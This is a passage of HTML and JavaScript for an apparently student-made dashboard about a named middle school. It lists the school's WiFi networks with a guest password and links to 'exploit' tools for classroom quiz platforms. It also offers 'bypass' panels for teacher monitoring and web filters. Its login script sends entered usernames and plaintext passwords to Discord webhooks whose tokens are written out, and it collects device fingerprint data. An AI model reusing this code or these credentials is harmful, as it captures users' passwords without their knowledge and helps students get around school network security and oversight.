        <!-- Existing System Panels -->
        <button onclick="dashboard.togglePanel('wifiPanel')">📡 School WiFi Information</button>
        <button onclick="dashboard.togglePanel('ipadPanel')">📱 School iPad Restrictions</button>
        <button onclick="dashboard.togglePanel('handbookPanel')">📘 Student Handbooks Information</button>
        <button onclick="dashboard.togglePanel('mapPanel')">🏫 School Building Map Information</button>
        <button onclick="dashboard.togglePanel('studentWebsitesPanel')">🌐 Student Website's Information</button>
        <button onclick="dashboard.togglePanel('teacherWebsitesPanel')">👩‍🏫 Teacher Websites Information</button>
        <button onclick="dashboard.togglePanel('phoneDirectoryPanel')">📞 School Phone Directory Information</button>
        <button onclick="dashboard.togglePanel('cameraPanel')">📷 School Camera Information</button>
        <button onclick="dashboard.togglePanel('schoolInfoPanel')">🏫 School Information</button>
        <button onclick="dashboard.togglePanel('exploitPanel')">🧨 Exploiting Tools</button>
        <button onclick="dashboard.togglePanel('bypassPanel')">🚪 Bypassing Tools</button>
        <button onclick="dashboard.togglePanel('vpnPanel')">🔐 VPN Websites</button>
        <button onclick="dashboard.togglePanel('gamingPanel')">🎮 Gaming Websites</button>
        <button onclick="dashboard.togglePanel('musicPanel')">🎵 Music Websites</button>
        <button onclick="dashboard.togglePanel('keyboardPanel')">🎹 Keyboard Tricks</button>

        <!-- New System Functionality Panels -->
        <button onclick="dashboard.togglePanel('systemToolsPanel')">🧰 System Tools</button>
        <button onclick="dashboard.togglePanel('networkDiagPanel')">🌐 Network Diagnostics</button>
        <button onclick="dashboard.togglePanel('securityAlertsPanel')">🔒 Security Center</button>
        <button onclick="dashboard.togglePanel('processMonitorPanel')">⚙️ Process Monitor</button>
        <button onclick="dashboard.togglePanel('fileExplorerPanel')">📁 File Explorer</button>
        <button onclick="dashboard.togglePanel('systemLogsPanel')">📜 System Logs</button>
        <button onclick="dashboard.togglePanel('reminderPanel')">📌 View Reminders</button>
      </div>

      <!-- Information Panels Container -->
      <div id="infoPanelsContainer" style="margin-top: 20px;">
        
        <!-- WiFi Panel -->
        <div id="wifiPanel" class="info-panel">
          <h2>📡 School WiFi Information</h2>
          <div class="wifi-grid">
            <div>Network Name</div><div>Wifi Level</div><div>Security Type</div><div>Encryption</div><div>Hidden?</div><div>Monitored?</div><div>Username</div><div>Password</div>
          </div>
          <div class="wifi-entry"><div>Middletown_Core</div><div>High</div><div>WPA3 Enterprise</div><div>High</div><div>No</div><div>Yes</div><div>Unknown</div><div>Unknown</div></div>
          <div class="wifi-entry"><div>Mtown_Core</div><div>High</div><div>WPA3 Enterprise</div><div>High</div><div>Yes</div><div>Unknown</div><div>Unknown</div><div>Unknown</div></div>
          <div class="wifi-entry"><div>Mtown Guest</div><div>Medium</div><div>WPA3 Enterprise</div><div>Medium</div><div>No</div><div>Rare</div><div>msguest</div><div>M@ms2021#</div></div>
          <div class="wifi-entry"><div>Radius Test</div><div>Low</div><div>WPA3 Enterprise</div><div>Low</div><div>No</div><div>Rarely</div><div>msguest</div><div>M@ms2021#</div></div>
        </div>

        <!-- iPad Panel -->
        <div id="ipadPanel" class="info-panel">
          <h2>📱 School iPad Restrictions</h2>
          <div class="ipad-options">
            <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
            <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
          </div>
          <div id="ipadRestrictions" class="ipad-content"><p>All standard educational apps are permitted. Access to social media and gaming sites is restricted via MDM profile.</p></div>
          <div id="ipadBypasses" class="ipad-content"><p>No known bypasses currently active on the school network.</p></div>
        </div>

        <!-- Handbook Panel -->
        <div id="handbookPanel" class="info-panel">
          <h2>📘 Student Handbooks Information</h2>
          <div class="handbook-buttons">
            <a href="#" target="_blank">Elementary Handbook (Jan 2025)</a>
            <a href="#" target="_blank">Secondary Student Handbook (Jan 2025)</a>
            <a href="#" target="_blank">District Handbook</a>
            <a href="#" target="_blank">RA Academy Handbook (Jan 2025)</a>
            <a href="#" target="_blank">Virtual Learning Plan (2024-2025)</a>
            <a href="#" target="_blank">Dress Code (2024-2025)</a>
          </div>
        </div>

        <!-- Map Panel -->
        <div id="mapPanel" class="info-panel">
          <h2>🏫 School Building Map Information</h2>
          <div class="coming-soon">Building Map Coming Soon</div>
        </div>

        <!-- Student Websites Panel -->
        <div id="studentWebsitesPanel" class="info-panel">
          <h2>🌐 Student Website's Information</h2>
          <div class="links-list">
            <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a><a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a><a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
            <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login</a>
            <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a><a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a><a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
            <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a><a href="https://id.naviance.com" target="_blank">Naviance</a><a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
            <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a><a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a><a href="https://www.safe2saypa.org" target="_blank">Safe2Say</a>
            <a href="https://mail.google.com/mail/" target="_blank">Gmail</a><a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour</a><a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
          </div>
        </div>

        <!-- Teacher Websites Panel -->
        <div id="teacherWebsitesPanel" class="info-panel">
          <h2>👩‍🏫 Teacher Websites Information</h2>
          <div class="links-list">
            <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a><a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a><a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
            <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a><a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey</a><a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
            <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a><a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher)</a>
            <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a><a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
            <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a><a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a><a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline</a>
            <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a><a href="https://id.naviance.com" target="_blank">Naviance</a><a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
            <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a><a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a><a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
            <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a><a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a><a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
            <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a><a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a><a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
          </div>
        </div>

        <!-- Phone Directory Panel -->
        <div id="phoneDirectoryPanel" class="info-panel">
          <h2>📞 School Phone Directory Information</h2>
          <div class="coming-soon">Update Coming Soon!</div>
        </div>

        <!-- Camera Panel -->
        <div id="cameraPanel" class="info-panel">
          <h2>📷 School Camera Information</h2>
          <div class="coming-soon">Update Coming Soon</div>
        </div>

        <!-- School Info Panel -->
        <div id="schoolInfoPanel" class="info-panel">
          <h2>🏫 School Information</h2>
          <div class="school-info-grid">
            <div class="school-info-item"><div class="school-info-label">School Name:</div><div>Middletown Area Middle School</div></div>
            <div class="school-info-item"><div class="school-info-label">School Address:</div><div>215 Oberlin Road Middletown, PA 17057</div></div>
            <div class="school-info-item"><div class="school-info-label">School Phone:</div><div>717-930-0739</div></div>
            <div class="school-info-item"><div class="school-info-label">School Fax:</div><div>717-944-0591</div></div>
            <div class="school-info-item"><div class="school-info-label">School Principal:</div><div>Dr. Shannon L. Wevodau</div></div>
            <div class="school-info-item"><div class="school-info-label">Principal's Phone:</div><div>717-930-0739</div></div>
            <div class="school-info-item"><div class="school-info-label">Principal's Email:</div><div>swevodau@raiderweb.org</div></div>
            <div class="school-info-item"><div class="school-info-label">Assistant Principal:</div><div>Mr. Michael DeFilippo</div></div>
            <div class="school-info-item"><div class="school-info-label">Assistant Principal's Phone:</div><div>717-930-0739</div></div>
            <div class="school-info-item"><div class="school-info-label">Assistant Principal's Email:</div><div>mdefilippo@raiderweb.org</div></div>
          </div>
        </div>

        <!-- Exploit Panel -->
        <div id="exploitPanel" class="info-panel">
          <h2>🧨 Exploiting Tools</h2>
          <div class="exploit-buttons">
            <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a><a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Kahoot Exploit</a><a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Gimkit Exploit</a>
            <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizlet Exploit</a><a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizzes Exploit</a><a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quills Exploit</a>
            <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Edpuzzle Exploit</a><a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Nearpod Exploit</a>
          </div>
        </div>

        <!-- Bypass Panel -->
        <div id="bypassPanel" class="info-panel">
          <h2>🚪 Bypassing Tools</h2>
          <div class="bypass-buttons">
            <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button><button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button><button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
            <button onclick="dashboard.showBypassContent('coming1')">Proxy Bypass</button><button onclick="dashboard.showBypassContent('coming2')">URL Filter Bypass</button><button onclick="dashboard.showBypassContent('coming3')">DNS Bypass</button>
          </div>
          <div id="bathroomBypass" class="bypass-content"><p>Currently unavailable. Please report to administration.</p></div>
          <div id="wifiBypass" class="bypass-content"><p>Access the 'School WiFi Information' panel for potential network insights.</p></div>
          <div id="monitoringBypass" class="bypass-content"><p>Teacher monitoring systems are complex. Explore network traffic analysis tools.</p></div>
          <div id="coming1Bypass" class="bypass-content"><p>Proxy bypass techniques involve redirecting traffic through alternative servers.</p></div>
          <div id="coming2Bypass" class="bypass-content"><p>URL filtering can often be circumvented using VPNs or specialized proxies.</p></div>
          <div id="coming3Bypass" class="bypass-content"><p>DNS bypass methods are experimental and may require advanced network knowledge.</p></div>
        </div>

        <!-- VPN Panel -->
        <div id="vpnPanel" class="info-panel">
          <h2>🔐 VPN Websites</h2>
          <div class="links-list">
            <a href="https://www.expressvpn.com" target="_blank">ExpressVPN</a><a href="https://www.nordvpn.com" target="_blank">NordVPN</a><a href="https://www.surfshark.com" target="_blank">Surfshark</a>
            <a href="https://www.privateinternetaccess.com" target="_blank">Private Internet Access</a><a href="https://protonvpn.com" target="_blank">ProtonVPN</a><a href="https://cyberghostvpn.com" target="_blank">CyberGhost VPN</a>
          </div>
        </div>

        <!-- Gaming Panel -->
        <div id="gamingPanel" class="info-panel">
          <h2>🎮 Gaming Websites</h2>
          <div class="coming-soon">
            <p>Accessing external gaming websites might violate network policies.</p>
            <p>Consider offline activities or approved educational games.</p>
          </div>
        </div>

        <!-- Music Panel -->
        <div id="musicPanel" class="info-panel">
          <h2>🎵 Music Websites</h2>
          <div class="coming-soon">
            <p>Streaming services may be restricted by network policy.</p>
            <p>Please use approved educational resources.</p>
          </div>
        </div>

        <!-- Keyboard Panel -->
        <div id="keyboardPanel" class="info-panel">
          <h2>🎹 Keyboard Tricks & Shortcuts</h2>
          <div class="info-text">
            <p><strong>System Navigation:</strong></p>
            <ul>
              <li>Spotlight Search: Command (⌘) + Space</li>
              <li>Home Screen: Command (⌘) + H</li>
              <li>App Switcher: Globe + Up Arrow</li>
              <li>Quick Note: Globe + Q</li>
            </ul>
            <p><strong>Window Management:</strong></p>
            <ul>
              <li>Split View: Control (⌃) + Globe + Left/Right Arrow</li>
              <li>Slide Over: Globe + Backslash</li>
            </ul>
            <p><strong>Safari & App Shortcuts:</strong></p>
            <ul>
              <li>New Tab: Command (⌘) + T</li>
              <li>Close Tab: Command (⌘) + W</li>
              <li>Reopen Closed Tab: Shift + Command (⌘) + T</li>
            </ul>
            <p><strong>Text Editing:</strong></p>
            <ul>
              <li>Select All: Command (⌘) + A</li>
              <li>Copy: Command (⌘) + C</li>
              <li>Paste: Command (⌘) + V</li>
              <li>Undo: Command (⌘) + Z</li>
            </ul>
            <p><strong>General Tips:</strong> Hold Command (⌘) to see app-specific shortcuts.</p>
          </div>
        </div>

        <!-- NEW PANEL: System Tools -->
        <div id="systemToolsPanel" class="info-panel">
          <h2>🧰 System Tools & Utilities</h2>
          <div class="system-tools-grid">
            <div class="tool-card" onclick="dashboard.simulateTool('disk')">
              <h3>Disk Usage</h3>
              <span>View storage status</span>
            </div>
            <div class="tool-card" onclick="dashboard.simulateTool('cpu')">
              <h3>CPU Monitor</h3>
              <span>Track processor activity</span>
            </div>
            <div class="tool-card" onclick="dashboard.simulateTool('memory')">
              <h3>Memory Monitor</h3>
              <span>Analyze RAM usage</span>
            </div>
            <div class="tool-card" onclick="dashboard.simulateTool('info')">
              <h3>System Information</h3>
              <span>Gather hardware/software details</span>
            </div>
            <div class="tool-card" onclick="dashboard.simulateTool('diagnostics')">
              <h3>Run Diagnostics</h3>
              <span>Perform system health checks</span>
            </div>
            <div class="tool-card" onclick="dashboard.simulateTool('temp')">
              <h3>Temperature Sensor</h3>
              <span>Check component temperatures</span>
            </div>
          </div>
        </div>

        <!-- NEW PANEL: Network Diagnostics -->
        <div id="networkDiagPanel" class="info-panel">
          <h2>🌐 Network Diagnostics</h2>
          <div class="network-input-group">
            <input type="text" id="networkHostInput" placeholder="Enter Hostname or IP Address..." />
            <button onclick="dashboard.runNetworkDiagnostic('ping')">Ping</button>
            <button onclick="dashboard.runNetworkDiagnostic('traceroute')">Traceroute</button>
          </div>
          <div class="network-results" id="networkResults">
            Awaiting command...
          </div>
        </div>

        <!-- NEW PANEL: Security Center -->
        <div id="securityAlertsPanel" class="info-panel">
          <h2>🔒 Security Center</h2>
          <div class="system-tools-grid">
            <div class="tool-card" onclick="dashboard.runSecurityScan('malware')">
              <h3>Scan for Malware</h3>
              <span>Quick system scan</span>
            </div>
            <div class="tool-card" onclick="dashboard.checkFirewall()">
              <h3>Check Firewall</h3>
              <span>Verify firewall status</span>
            </div>
            <div class="tool-card" onclick="dashboard.viewSecurityLogs()">
              <h3>View Security Logs</h3>
              <span>Access audit trails</span>
            </div>
            <div class="tool-card" onclick="dashboard.updateDefinitions()">
              <h3>Update Definitions</h3>
              <span>Fetch latest security signatures</span>
            </div>
            <div class="tool-card" onclick="dashboard.runSecurityScan('vulnerability')">
              <h3>Vulnerability Scan</h3>
              <span>Scan for system weaknesses</span>
            </div>
          </div>
        </div>

        <!-- NEW PANEL: Process Monitor -->
        <div id="processMonitorPanel" class="info-panel">
          <h2>⚙️ Process Monitor</h2>
          <div class="system-tools-grid" style="grid-template-columns: 1fr;">
            <div class="tool-card" onclick="dashboard.refreshProcesses()">
              <h3>Refresh Processes</h3>
              <span>Update process list</span>
            </div>
          </div>
          <table class="process-table">
            <thead>
              <tr>
                <th>PID</th><th>Name</th><th>CPU %</th><th>Memory %</th><th>Status</th><th>Actions</th>
              </tr>
            </thead>
            <tbody id="processListBody">
              <!-- Process rows will be generated here -->
            </tbody>
          </table>
        </div>

        <!-- NEW PANEL: File Explorer -->
        <div id="fileExplorerPanel" class="info-panel">
          <h2>📁 File Explorer</h2>
          <div class="system-tools-grid" style="grid-template-columns: 1fr;">
            <div class="tool-card" onclick="dashboard.refreshFileTree()">
              <h3>Refresh Explorer</h3>
              <span>Reload file structure</span>
            </div>
          </div>
          <div class="file-explorer">
            <div class="file-tree" id="fileTree">
              <ul>
                <li onclick="dashboard.selectFileNode(event, 'root')">/</li>
              </ul>
            </div>
            <div class="file-view" id="fileView">
              <p>Select a directory from the left panel.</p>
            </div>
          </div>
        </div>

        <!-- NEW PANEL: System Logs -->
        <div id="systemLogsPanel" class="info-panel">
          <h2>📜 System Logs</h2>
          <div class="system-tools-grid">
            <div class="tool-card" onclick="dashboard.filterLogs()">
              <h3>Filter Logs</h3>
              <span>By level or keyword</span>
            </div>
            <div class="tool-card" onclick="dashboard.clearLogs()">
              <h3>Clear Logs</h3>
              <span>Purge all log entries</span>
            </div>
            <div class="tool-card" onclick="dashboard.exportLogs()">
              <h3>Export Logs</h3>
              <span>Save logs to a file</span>
            </div>
          </div>
          <div class="log-container" id="logContainer">
            <!-- Log entries will appear here -->
          </div>
        </div>

        <!-- NEW PANEL: Reminder System -->
        <div id="reminderPanel" class="info-panel">
          <h2>📌 System Reminders</h2>
          <div class="reminder-input-group">
            <input type="text" id="reminderInput" placeholder="Add a new reminder..." />
            <button id="addReminderBtn">Add</button>
          </div>
          <ul id="reminderList">
            <!-- Reminders will be listed here -->
          </ul>
        </div>

      </div><!-- End of infoPanelsContainer -->
    </div><!-- End of dashboard -->
  </div><!-- End of appContainer -->

  <script>
    // =========================================================================
    // Notification System
    // =========================================================================
    const notificationContainer = document.getElementById('notificationContainer');

    function showNotification(message, type = 'info', duration = 5000) {
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.innerHTML = `
            <div class="notification-icon"></div>
            <div class="notification-message">${message}</div>
            <button class="close-notification">&times;</button>
        `;
        
        // Assign class for styling based on type
        switch(type) {
            case 'error': notification.style.borderLeftColor = '#e74c3c'; break;
            case 'success': notification.style.borderLeftColor = '#2ecc71'; break;
            case 'warning': notification.style.borderLeftColor = '#f39c12'; break;
            case 'info': notification.style.borderLeftColor = '#3498db'; break;
            case 'system': notification.style.borderLeftColor = '#ff914d'; break;
            default: notification.style.borderLeftColor = '#bdc3c7'; break;
        }

        notificationContainer.prepend(notification); // Add to the top

        // Remove notification after duration
        setTimeout(() => {
            notification.style.animation = `slideOut 0.5s forwards`;
            setTimeout(() => notification.remove(), 500); // Match animation duration
        }, duration);

        // Close button functionality
        notification.querySelector('.close-notification').addEventListener('click', () => {
            notification.style.animation = `slideOut 0.5s forwards`;
            setTimeout(() => notification.remove(), 500);
        });
    }

    // =========================================================================
    // Loading Sequence
    // =========================================================================
    const loadingScreen = document.getElementById('loadingScreen');
    const stage1 = document.getElementById('stage1');
    const stage2 = document.getElementById('stage2');
    const stage3 = document.getElementById('stage3');
    const appContainer = document.getElementById('appContainer');
    const loginBox = document.getElementById('loginBox');
    const dashboard = document.getElementById('dashboard');

    function setLoadingStage(element, duration = 1500) {
        return new Promise(resolve => {
            element.style.display = 'block';
            setTimeout(() => {
                element.style.animation = `fadeInText 0.7s forwards`; // Apply animation
                setTimeout(resolve, 700); // Resolve after animation
            }, 50);
        });
    }

    async function startLoadingSequence() {
        await setLoadingStage(stage1);
        await new Promise(resolve => setTimeout(resolve, 1000)); // Wait a bit
        await setLoadingStage(stage2);
        await new Promise(resolve => setTimeout(resolve, 1200)); // Wait a bit longer
        await setLoadingStage(stage3);
        await new Promise(resolve => setTimeout(resolve, 800)); // Final wait

        loadingScreen.style.opacity = '0';
        loadingScreen.style.pointerEvents = 'none';
        document.body.style.overflow = 'auto'; // Allow scrolling for dashboard
        document.body.classList.add('dashboard-body'); // Switch to dashboard body style
        dashboard.style.display = 'block'; // Show dashboard
        
        // Login is initially hidden and will be shown after init if not logged in
        // For this setup, we'll show the login AFTER the loader finishes.
        // If we want login first, then dashboard, we'd adjust this.
        // For now, let's assume loader -> dashboard.
        // If the goal is loader -> login -> dashboard, we'd show loginBox and hide dashboard here.
        // Given the prompt is "before the actual site loads... box animation... then loads to key system then dashboard",
        // it implies loader -> login -> dashboard.
        // Let's adjust to show login after loader.
        loginBox.style.display = 'block'; 
        dashboard.style.display = 'none'; // Ensure dashboard remains hidden initially
    }


    // =========================================================================
    // Login System JavaScript (Modified & Extended)
    // =========================================================================
    const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json'; // Example URL

    // Webhooks for the new logging systems
    const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU', // Placeholder
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI', // Placeholder
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA', // Placeholder
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp', // Placeholder
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp', // Placeholder
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5', // Placeholder
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw', // Placeholder
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ', // Placeholder
        reset_code_detected: 'https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq', // Placeholder
        reset_code_accepted: 'https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB', // Placeholder
        reset_code_incorrect: 'https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip' // Placeholder
    };

    // Original webhooks (for system logging)
    const webhookUrls = {
      userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3', // Placeholder
      browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP', // Placeholder
      deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F', // Placeholder
      connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D', // Placeholder
      sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk' // Placeholder
    };

    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const userIDInput = document.getElementById('userID');
    const showPasswordCheckbox = document.getElementById('showPassword');
    const submitBtn = document.getElementById('submitBtn');
    const errorMsg = document.getElementById('errorMsg');
    const attemptsText = document.getElementById('attemptsText');
    const resetPopup = document.getElementById('resetPopup');
    const resetField = document.getElementById('resetField');
    const resetBtn = document.getElementById('resetBtn');

    let attempts = 5;
    let users = [];
    let loginTime = null;

    // Show/hide password toggle
    showPasswordCheckbox.addEventListener('change', () => {
      passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
    });

    // Fetch user JSON data on load
    async function fetchUsers() {
      try {
        const response = await fetch(USER_JSON_URL);
        if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
        users = await response.json();
        showNotification('Whitelist data loaded successfully.', 'success');
      } catch (e) {
        users = []; // Fallback to empty array
        console.error('Failed to load user JSON data:', e);
        showNotification('Failed to load whitelist data. Proceeding with limited functionality.', 'error');
      }
    }

    // Flash red outline function
    function flashRedOutline(times = 2, delay = 400) {
      loginBox.classList.add('flashing');
      setTimeout(() => {
        loginBox.classList.remove('flashing');
      }, delay * times);
    }

    // Get WebGL Renderer
    function getWebGLRenderer() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return "Unavailable";
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
      } catch { return "Unavailable"; }
    }

    // Battery status promise
    async function getBatteryStatus() {
      if (navigator.getBattery) {
        try { return await navigator.getBattery(); } catch { return null; }
      }
      return null;
    }

    // Build user info object from user JSON
    function findUser(username, userID) {
      return users.find(u =>
        u.username?.toLowerCase() === username.toLowerCase() &&
        u.userID?.toString() === userID.toString()
      );
    }

    // Send Discord webhook with custom embed fields
    async function sendWebhook(url, embed) {
      if (!url) {
        console.warn('Attempted to send webhook with invalid URL.');
        return;
      }
      try {
        await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ embeds: [embed] }),
        });
      } catch (e) {
        console.warn('Webhook send failed:', e);
      }
    }

    // Collect browser & device info for logs
    async function collectLoggingData(user, password) {
      const now = new Date();
      loginTime = now.toISOString();
      const batteryStatus = await getBatteryStatus();

      return {
        user: user || { name: "N/A", username: "N/A", userID: "N/A" }, // Handle cases where user is not found
        password,
        loginTime,
        batteryStatus,
        webglRenderer: getWebGLRenderer(),
      };
    }

    // New logging functions for the specific systems
    async function logEvent(webhookKey, title, color, fields) {
      const embed = {
        title: `[${typeToTitle(webhookKey)}] ${title}`,
        color: color,
        fields: [
          ...(fields || []),
          { name: "Timestamp", value: new Date().toLocaleString(), inline: false }
        ]
      };
      await sendWebhook(loggingWebhooks[webhookKey], embed);
    }
    
    function typeToTitle(key) {
        return key.replace(/_/g, ' ').replace(/\b\w/g, char => char.toUpperCase());
    }

    async function logUsername(name, username) { await logEvent('username', "Username Logged", 0x3498db, [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }]); }
    async function logPassword(name, password) { await logEvent('password', "Password Logged", 0xe74c3c, [{ name: "Name", value: name || "N/A", inline: true }, { name: "Password", value: password, inline: true }]); }
